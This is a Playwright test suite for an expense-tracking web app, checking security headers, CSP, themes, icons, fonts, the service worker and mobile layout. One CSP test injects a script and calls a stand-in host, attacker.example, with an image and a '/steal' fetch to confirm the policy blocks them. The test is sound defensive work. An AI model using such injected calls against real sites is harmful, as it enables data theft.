import { test, expect, type APIRequestContext, type Page } from '@playwright/test'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'

// Platform contract in a real browser, against `vite preview`, which serves the same security
// headers as vercel.json (vite.config.js reads them from there), so every page here runs under
// the production CSP. Both projects: Desktop Chrome (Chromium) and iPhone 14 (WebKit, coarse
// pointer). Build output is read over HTTP, so the suite checks whatever the server serves.

interface HeaderRule {
  source: string
  headers: { key: string; value: string }[]
}

const vercel = JSON.parse(
  readFileSync(fileURLToPath(new URL('../vercel.json', import.meta.url)), 'utf8'),
) as { headers: HeaderRule[] }
const securityHeaders = vercel.headers.find((h) => h.source === '/(.*)')?.headers ?? []

const FONT_FILES = ['ibm-plex-sans', 'jetbrains-mono'].flatMap((family) =>
  ['400', '500', '600', '700'].map((w) => `fonts/${family}-latin-${w}-normal.woff2`),
)

declare global {
  interface Window {
    __cspViolations: string[]
  }
}

/** The shell is mounted and no lazy screen is still showing its loading skeleton. */
async function ready(page: Page) {
  await page.waitForLoadState('networkidle')
  await expect(page.locator('main')).toBeVisible()
  await expect(page.getByText('Loading screen')).toHaveCount(0)
}

/** Records every CSP violation event and every CSP / Permissions-Policy console message. */
async function trackPolicyNoise(page: Page) {
  await page.addInitScript(() => {
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations.push(`${e.violatedDirective} ${e.blockedURI}`)
    })
  })
  const messages: string[] = []
  page.on('console', (msg) => {
    const text = msg.text()
    if (/content security policy|refused to|permissions[- ]policy/i.test(text)) messages.push(text)
  })
  return {
    violations: () => page.evaluate(() => window.__cspViolations),
    async expectQuiet() {
      expect(await page.evaluate(() => window.__cspViolations)).toEqual([])
      expect(messages).toEqual([])
    },
  }
}

async function closeOverlay(page: Page) {
  await page.keyboard.press('Escape')
  await expect(page.getByRole('dialog')).toHaveCount(0)
}

async function addExpense(page: Page, what: string, amount: string) {
  await page.getByRole('button', { name: 'Full entry form' }).click()
  await page.getByPlaceholder(/coffee, grab, spotify/i).fill(what)
  await page.getByPlaceholder('0.00').fill(amount)
  await page.getByPlaceholder('0.00').press('Enter')
  await expect(page.getByRole('dialog')).toHaveCount(0)
}

const TEXT_CONTROLS =
  'input:not([type=checkbox]):not([type=radio]):not([type=range]):not([type=color]):not([type=file]):not([type=button]):not([type=submit]):not([type=reset]):not([type=image]):not([type=hidden]), select, textarea'

/** Font size of every visible text control on the page. */
async function textControlSizes(page: Page) {
  return page.evaluate((selector) => {
    return [...document.querySelectorAll<HTMLElement>(selector)]
      .filter((el) => {
        const r = el.getBoundingClientRect()
        return r.width > 0 && r.height > 0
      })
      .map((el) => ({
        control:
          el.getAttribute('aria-label') ??
          el.getAttribute('placeholder') ??
          (el.id || el.tagName.toLowerCase()),
        px: parseFloat(getComputedStyle(el).fontSize),
      }))
  }, TEXT_CONTROLS)
}

function pngHeader(buf: Buffer) {
  expect(buf.subarray(1, 4).toString('latin1')).toBe('PNG')
  return { width: buf.readUInt32BE(16), height: buf.readUInt32BE(20), colorType: buf[25] }
}

async function getText(request: APIRequestContext, path: string) {
  const res = await request.get(path)
  expect(res.status(), path).toBe(200)
  return res.text()
}

/** Built shell and its chunk graph, discovered from the served index.html. */
async function builtShell(request: APIRequestContext) {
  const html = await getText(request, '/')
  const entryPath = /<script type="module" crossorigin src="\/(assets\/index-[\w-]+\.js)"/.exec(
    html,
  )?.[1]
  expect(entryPath, 'entry script').toBeDefined()
  const entry = await getText(request, `/${entryPath ?? ''}`)
  const chunk = async (name: string) => {
    const path = new RegExp(`assets/${name}-[\\w-]+\\.js`).exec(html + entry)?.[0]
    expect(path, name).toBeDefined()
    return getText(request, `/${path ?? ''}`)
  }
  return { html, entry, chunk }
}

// ─── headers ───────────────────────────────────────────────────────────────

test.describe('Security headers', () => {
  test('every response carries the vercel.json security headers', async ({ request }) => {
    expect(securityHeaders).toHaveLength(6)
    const { html } = await builtShell(request)
    const css = /href="\/(assets\/index-[\w-]+\.css)"/.exec(html)?.[1] ?? ''
    for (const path of [
      '/',
      '/ledger',
      '/pulse?add=1',
      `/${css}`,
      '/fonts/ibm-plex-sans-latin-400-normal.woff2',
      '/sw.js',
      '/manifest.webmanifest',
    ]) {
      const res = await request.get(path)
      expect(res.status(), path).toBe(200)
      const headers = res.headers()
      for (const { key, value } of securityHeaders) {
        expect(headers[key.toLowerCase()], `${key} on ${path}`).toBe(value)
      }
    }
  })
})

// ─── CSP ───────────────────────────────────────────────────────────────────

test.describe('Content Security Policy', () => {
  // Whole-UI walks. Under WebKit phone emulation the settings walk alone takes 15-23 s on an
  // idle machine and ran past the 30 s default once while the full suite was running.
  test.slow(({ browserName }) => browserName === 'webkit', 'long walks in WebKit emulation')

  test('no violations on any route, cold or navigated in-app', async ({ page }) => {
    const noise = await trackPolicyNoise(page)
    for (const path of ['/', '/pulse', '/ledger', '/insights']) {
      await page.goto(path)
      await ready(page)
    }
    for (const tab of ['Ledger', 'Insights', 'Pulse']) {
      await page.getByRole('link', { name: tab, exact: true }).first().click()
      await ready(page)
    }
    // The app-shortcut URL (it may open the add sheet).
    await page.goto('/pulse?add=1')
    await ready(page)
    await noise.expectQuiet()
  })

  test('no violations in the palette, add sheet and hotkeys', async ({ page }, testInfo) => {
    const noise = await trackPolicyNoise(page)
    await page.goto('/pulse')
    await ready(page)

    await page.getByRole('button', { name: 'Search', exact: true }).click()
    await page.getByRole('dialog').getByRole('combobox').fill('coffee')
    await closeOverlay(page)
    if (testInfo.project.name === 'chromium') {
      await page.keyboard.press('Control+k')
      await expect(page.getByRole('dialog')).toBeVisible()
      await closeOverlay(page)
      await page.keyboard.press('?')
      await page.keyboard.press('Escape')
    }

    await addExpense(page, 'CSP walk lunch', '12.40')
    await noise.expectQuiet()
  })

  test('no violations in settings: every tab, every theme, JSON backup', async ({ page }) => {
    const noise = await trackPolicyNoise(page)
    await page.goto('/pulse')
    await ready(page)
    await addExpense(page, 'CSP settings coffee', '4.50')

    await page.getByRole('button', { name: 'Settings' }).first().click()
    for (const tab of ['Categories', 'Budgets', 'Sync', 'Backup']) {
      await page.getByRole('tab', { name: tab, exact: true }).click()
    }
    const download = page.waitForEvent('download')
    await page.getByRole('button', { name: /download json backup/i }).click()
    expect((await download).suggestedFilename()).toMatch(/\.json$/)
    for (const theme of ['Light', 'Dark', 'System']) {
      await page.getByRole('radio', { name: theme }).click()
    }
    await closeOverlay(page)
    await noise.expectQuiet()
  })

  test('no violations in the ledger: edit sheet and CSV export', async ({ page }) => {
    const noise = await trackPolicyNoise(page)
    await page.goto('/pulse')
    await ready(page)
    await addExpense(page, 'CSP ledger dinner', '23.10')

    await page.getByRole('link', { name: 'Ledger', exact: true }).first().click()
    await ready(page)
    const download = page.waitForEvent('download')
    await page.getByRole('button', { name: 'Export filtered entries to CSV' }).click()
    expect((await download).suggestedFilename()).toMatch(/\.csv$/)
    await page.getByText('CSP ledger dinner').first().click()
    await expect(page.getByRole('dialog')).toBeVisible()
    await closeOverlay(page)
    await noise.expectQuiet()
  })

  test('is enforcing: injected script, image and cross-origin fetch are blocked', async ({
    page,
  }) => {
    const noise = await trackPolicyNoise(page)
    await page.goto('/pulse')
    await ready(page)
    const ran = await page.evaluate(async () => {
      const w = window as Window & { __injected?: boolean }
      const script = document.createElement('script')
      script.textContent = 'window.__injected = true'
      document.body.append(script)
      const img = document.createElement('img')
      img.src = 'https://attacker.example/pixel.png'
      document.body.append(img)
      await fetch('https://attacker.example/steal').catch(() => undefined)
      return w.__injected === true
    })
    expect(ran).toBe(false)
    await expect.poll(async () => (await noise.violations()).length).toBeGreaterThanOrEqual(3)
    const directives = (await noise.violations()).map((v) => v.split(' ')[0] ?? '')
    expect(directives.some((d) => d.startsWith('script-src'))).toBe(true)
    expect(directives).toContain('img-src')
    expect(directives).toContain('connect-src')
  })
})

// ─── theme before first paint ──────────────────────────────────────────────

test.describe('Theme before first paint', () => {
  const cases = [
    { stored: 'light', os: 'dark', expected: 'light' },
    { stored: 'dark', os: 'light', expected: 'dark' },
    { stored: 'system', os: 'light', expected: 'light' },
    { stored: 'system', os: 'dark', expected: 'dark' },
    { stored: null, os: 'light', expected: 'light' },
  ] as const
  const chrome = {
    dark: { color: '#0c0b0a', bg: 'rgb(12, 11, 10)' },
    light: { color: '#faf8f5', bg: 'rgb(250, 248, 245)' },
  }

  for (const { stored, os, expected } of cases) {
    test(`stored ${String(stored)} on a ${os} OS paints ${expected} before the app runs`, async ({
      page,
    }) => {
      // The app bundle never runs, so whatever theme is on screen came from index.html alone.
      await page.route(/\/assets\/index-[\w-]+\.js$/, (route) => route.abort())
      await page.emulateMedia({ colorScheme: os })
      await page.addInitScript((value) => {
        if (value === null) localStorage.removeItem('spendtrack:theme')
        else localStorage.setItem('spendtrack:theme', value)
      }, stored)
      await page.goto('/pulse', { waitUntil: 'load' })
      const state = await page.evaluate(() => ({
        theme: document.documentElement.dataset.theme,
        themeColor: document.querySelector('meta[name="theme-color"]')?.getAttribute('content'),
        colorScheme: document.querySelector('meta[name="color-scheme"]')?.getAttribute('content'),
        rootScheme: getComputedStyle(document.documentElement).colorScheme,
        bg: getComputedStyle(document.body).backgroundColor,
        appMounted: (document.getElementById('root')?.childElementCount ?? 0) > 0,
      }))
      expect(state).toEqual({
        theme: expected,
        themeColor: chrome[expected].color,
        colorScheme: expected,
        rootScheme: expected,
        bg: chrome[expected].bg,
        appMounted: false,
      })
    })
  }
})

// ─── manifest, icons, head ─────────────────────────────────────────────────

test.describe('Manifest and install icons', () => {
  test('one manifest link, in head, with an id that keeps existing installs', async ({
    page,
    request,
  }) => {
    await page.goto('/pulse')
    const links = await page
      .locator('link[rel="manifest"]')
      .evaluateAll((els) => els.map((el) => [el.getAttribute('href'), el.parentElement?.tagName]))
    expect(links).toEqual([['/manifest.webmanifest', 'HEAD']])

    const res = await request.get('/manifest.webmanifest')
    expect(res.status()).toBe(200)
    const manifest = (await res.json()) as Record<string, unknown>
    expect(manifest).toMatchObject({
      id: '/pulse',
      start_url: '/pulse',
      scope: '/',
      display: 'standalone',
      launch_handler: { client_mode: ['focus-existing', 'auto'] },
      theme_color: '#0c0b0a',
      background_color: '#0c0b0a',
      lang: 'en',
      dir: 'ltr',
    })
    expect(manifest).not.toHaveProperty('orientation')
    expect(manifest.shortcuts).toEqual([
      {
        name: 'Add expense',
        short_name: 'Add',
        description: 'Log a new expense',
        url: '/pulse?add=1',
        icons: [{ src: '/shortcut-add-96.png', sizes: '96x96', type: 'image/png' }],
      },
    ])
  })

  test('any and maskable icons exist at their declared sizes; opaque where the OS masks', async ({
    request,
  }) => {
    const manifest = (await (await request.get('/manifest.webmanifest')).json()) as {
      icons: { src: string; sizes: string; type: string; purpose: string }[]
    }
    expect(manifest.icons.map((i) => `${i.purpose} ${i.src}`)).toEqual([
      'any /favicon.svg',
      'any /icon-192.png',
      'any /icon-512.png',
      'maskable /icon-maskable-192.png',
      'maskable /icon-maskable-512.png',
    ])
    const opaque = [
      ['/icon-maskable-192.png', 192],
      ['/icon-maskable-512.png', 512],
      ['/apple-touch-icon.png', 180],
      ['/shortcut-add-96.png', 96],
    ] as const
    for (const [src, size] of opaque) {
      const res = await request.get(src)
      expect(res.status(), src).toBe(200)
      expect(res.headers()['content-type']).toContain('image/png')
      // Colour type 2 = RGB with no alpha channel: opaque by construction.
      expect(pngHeader(await res.body()), src).toEqual({ width: size, height: size, colorType: 2 })
    }
    for (const icon of manifest.icons.filter((i) => i.type === 'image/png')) {
      const { width, height } = pngHeader(await (await request.get(icon.src)).body())
      expect(`${String(width)}x${String(height)}`).toBe(icon.sizes)
    }
  })
})

// ─── fonts ─────────────────────────────────────────────────────────────────

test.describe('Self-hosted fonts', () => {
  test('both families load from this origin and nothing goes to Google', async ({ page }) => {
    const thirdParty: string[] = []
    const fontResponses: string[] = []
    const preloadWarnings: string[] = []
    page.on('request', (req) => {
      if (/fonts\.(googleapis|gstatic)\.com/.test(req.url())) thirdParty.push(req.url())
    })
    page.on('response', (res) => {
      const { pathname } = new URL(res.url())
      if (pathname.startsWith('/fonts/') && res.status() === 200) fontResponses.push(pathname)
    })
    page.on('console', (msg) => {
      if (/preload/i.test(msg.text())) preloadWarnings.push(msg.text())
    })
    await page.goto('/pulse')
    await ready(page)
    const loaded = await page.evaluate(async () => {
      await document.fonts.load('600 16px "IBM Plex Sans"')
      await document.fonts.load('500 16px "JetBrains Mono"')
      await document.fonts.ready
      return [...document.fonts]
        .filter((f) => f.status === 'loaded')
        .map((f) => `${f.family.replace(/"/g, '')} ${f.weight}`)
    })
    expect(loaded).toEqual(
      expect.arrayContaining([
        'IBM Plex Sans 400',
        'IBM Plex Sans 500',
        'IBM Plex Sans 600',
        'JetBrains Mono 500',
      ]),
    )
    expect(fontResponses).toEqual(
      expect.arrayContaining([
        '/fonts/ibm-plex-sans-latin-400-normal.woff2',
        '/fonts/ibm-plex-sans-latin-500-normal.woff2',
        '/fonts/ibm-plex-sans-latin-600-normal.woff2',
      ]),
    )
    expect(thirdParty).toEqual([])
    // A preloaded face that the first render does not paint makes Chromium warn after ~3 s.
    await page.waitForTimeout(3500)
    expect(preloadWarnings).toEqual([])
  })
})

// ─── service worker build ──────────────────────────────────────────────────

test.describe('Service worker build', () => {
  test('prompt-style update: SKIP_WAITING listener, no top-level skipWaiting', async ({
    request,
  }) => {
    const sw = await getText(request, '/sw.js')
    expect(sw).toMatch(/addEventListener\(\s*["']message["'][\s\S]{0,200}SKIP_WAITING/)
    expect(sw.match(/skipWaiting\(\)/g)).toHaveLength(1)
    expect(sw).toMatch(/clientsClaim\(\)/)
  })

  test('precache: no PNG, no duplicates, all 8 fonts and the favicon', async ({ request }) => {
    const sw = await getText(request, '/sw.js')
    const urls = [...sw.matchAll(/url:\s*"([^"]+)"/g)].map((m) => m[1] ?? '')
    expect(urls.length).toBeGreaterThan(10)
    expect(urls.filter((u) => u.endsWith('.png'))).toEqual([])
    expect(new Set(urls).size).toBe(urls.length)
    expect(urls).toEqual(expect.arrayContaining([...FONT_FILES, 'favicon.svg', 'index.html']))
    expect(urls).not.toContain('registerSW.js')
  })

  test('the app registers its own worker: no registerSW.js, no injected register script', async ({
    request,
  }) => {
    const { html } = await builtShell(request)
    expect(html).not.toMatch(/registerSW/)
    // A missing file falls back to index.html in preview; it must not be a script.
    const res = await request.get('/registerSW.js')
    expect(res.headers()['content-type']).not.toContain('javascript')
  })
})

// ─── chunk graph ───────────────────────────────────────────────────────────

test.describe('Chunk graph', () => {
  // T5b: overlays and the ledger swipe move with CSS transitions and the Web Animations API.
  test('no animation library ships, the entry preloads only React and the utils, React lives in vendor-react', async ({
    request,
  }) => {
    const { html, entry, chunk } = await builtShell(request)
    expect(html + entry).not.toMatch(/vendor-motion/)
    const preloads = [...html.matchAll(/modulepreload[^>]*href="\/assets\/([\w-]+)-[\w-]{8}\.js"/g)]
      .map((m) => m[1] ?? '')
      .sort()
    expect(preloads).toEqual(['vendor-react', 'vendor-utils'])
    const staticImports = [
      ...entry.matchAll(/(?:^|;)\s*import\s*(?:[^'"]*?from\s*)?["']([^"']+)["']/g),
    ].map((m) => m[1] ?? '')
    expect(staticImports.length).toBeGreaterThan(0)
    expect(staticImports.filter((s) => !/vendor-(react|utils)-/.test(s))).toEqual([])
    expect(entry).not.toContain('react.transitional.element')
    expect(await chunk('vendor-react')).toContain('react.transitional.element')
    // Nothing the service worker would cache for offline use is an animation library either.
    expect(await getText(request, '/sw.js')).not.toMatch(/vendor-motion/)
  })
})

// ─── iOS focus zoom floor ──────────────────────────────────────────────────

test.describe('Text controls and iOS focus zoom', () => {
  test('mobile: every text control is at least 16 px', async ({ page }, testInfo) => {
    test.skip(testInfo.project.name !== 'mobile', 'coarse pointer only')
    const small: { where: string; control: string; px: number }[] = []
    let checked = 0
    const sweep = async (where: string) => {
      const sizes = await textControlSizes(page)
      checked += sizes.length
      for (const s of sizes) if (s.px < 16) small.push({ where, ...s })
    }

    await page.goto('/pulse')
    await ready(page)
    await sweep('pulse')

    await page.getByRole('button', { name: 'Search', exact: true }).click()
    await expect(page.getByRole('dialog')).toBeVisible()
    await sweep('palette')
    await closeOverlay(page)

    await page.locator('nav').getByRole('button', { name: 'Add expense' }).click()
    await expect(page.getByRole('dialog')).toBeVisible()
    await sweep('add sheet')
    await closeOverlay(page)

    await page.getByRole('button', { name: 'Open settings' }).click()
    await expect(page.getByRole('dialog')).toBeVisible()
    await sweep('settings categories')
    await page.getByRole('tab', { name: 'Budgets', exact: true }).click()
    await sweep('settings budgets')
    await closeOverlay(page)

    await page.goto('/ledger')
    await ready(page)
    await sweep('ledger')

    expect(checked).toBeGreaterThan(10)
    expect(small).toEqual([])
  })

  // The 16 px floor makes text wider; fields sized for 13 px text must still show it all.
  test('mobile: a 9-character budget still fits its field at 320 px', async ({
    page,
  }, testInfo) => {
    test.skip(testInfo.project.name !== 'mobile', 'coarse pointer only')
    await page.setViewportSize({ width: 320, height: 700 })
    await page.goto('/pulse')
    await ready(page)
    await page.getByRole('button', { name: 'Open settings' }).click()
    await expect(page.getByRole('dialog')).toBeVisible()
    await page.getByRole('tab', { name: 'Budgets', exact: true }).click()

    const budget = page.getByRole('spinbutton', { name: /^Monthly budget for / }).first()
    await budget.fill('123456.78')
    const field = await budget.evaluate((el) => ({
      px: parseFloat(getComputedStyle(el).fontSize),
      scroll: el.scrollWidth,
      client: el.clientWidth,
    }))
    expect(field.px).toBe(16)
    expect(field.scroll).toBeLessThanOrEqual(field.client)
    const row = await budget
      .locator('xpath=ancestor::li[1]')
      .evaluate((el) => ({ scroll: el.scrollWidth, client: el.clientWidth }))
    expect(row.scroll).toBeLessThanOrEqual(row.client)
  })

  test('mobile: the edit sheet keeps its "More…" chip at chip size', async ({ page }, testInfo) => {
    test.skip(testInfo.project.name !== 'mobile', 'coarse pointer only')
    await page.goto('/pulse')
    await ready(page)
    await addExpense(page, 'Kopi O', '1.8')
    await page.goto('/ledger')
    await ready(page)
    await page.getByRole('button', { name: /^Edit Kopi O,/ }).click()
    const sheet = page.getByRole('dialog', { name: 'Edit expense' })
    await expect(sheet).toBeVisible()

    const more = sheet.getByRole('combobox', { name: 'More categories' })
    const chip = await more.evaluate((el) => {
      const box = el.parentElement?.getBoundingClientRect()
      const label = el.parentElement?.querySelector('span[aria-hidden="true"]')
      return {
        height: Math.round(box?.height ?? 0),
        labelPx: label ? parseFloat(getComputedStyle(label).fontSize) : 0,
        selectPx: parseFloat(getComputedStyle(el).fontSize),
      }
    })
    // The 36 px chip of the category chips beside it (T6: 36 px drawn, 44 px to the finger).
    expect(chip).toEqual({ height: 36, labelPx: 12, selectPx: 16 })
    const chips = await sheet
      .getByRole('group', { name: 'Category' })
      .getByRole('button')
      .evaluateAll((els) => els.map((el) => Math.round(el.getBoundingClientRect().height)))
    expect(chips.length).toBeGreaterThan(0)
    expect(new Set(chips)).toEqual(new Set([36]))
  })

  test('desktop: quick add keeps its 14 px / 15 px design sizes', async ({ page }, testInfo) => {
    test.skip(testInfo.project.name !== 'chromium', 'fine pointer only')
    const quickAdd = page.getByRole('textbox', { name: 'Quick add expense' })
    // lg and up: the dense top-bar field; below lg: the Pulse card field.
    for (const [width, px] of [
      [1280, 14],
      [900, 15],
    ] as const) {
      await page.setViewportSize({ width, height: 800 })
      await page.goto('/pulse')
      await ready(page)
      const sizes = await quickAdd.evaluateAll((els) =>
        els.map((el) => parseFloat(getComputedStyle(el).fontSize)),
      )
      expect(sizes, `${String(width)}px`).toEqual([px])
    }
  })
})
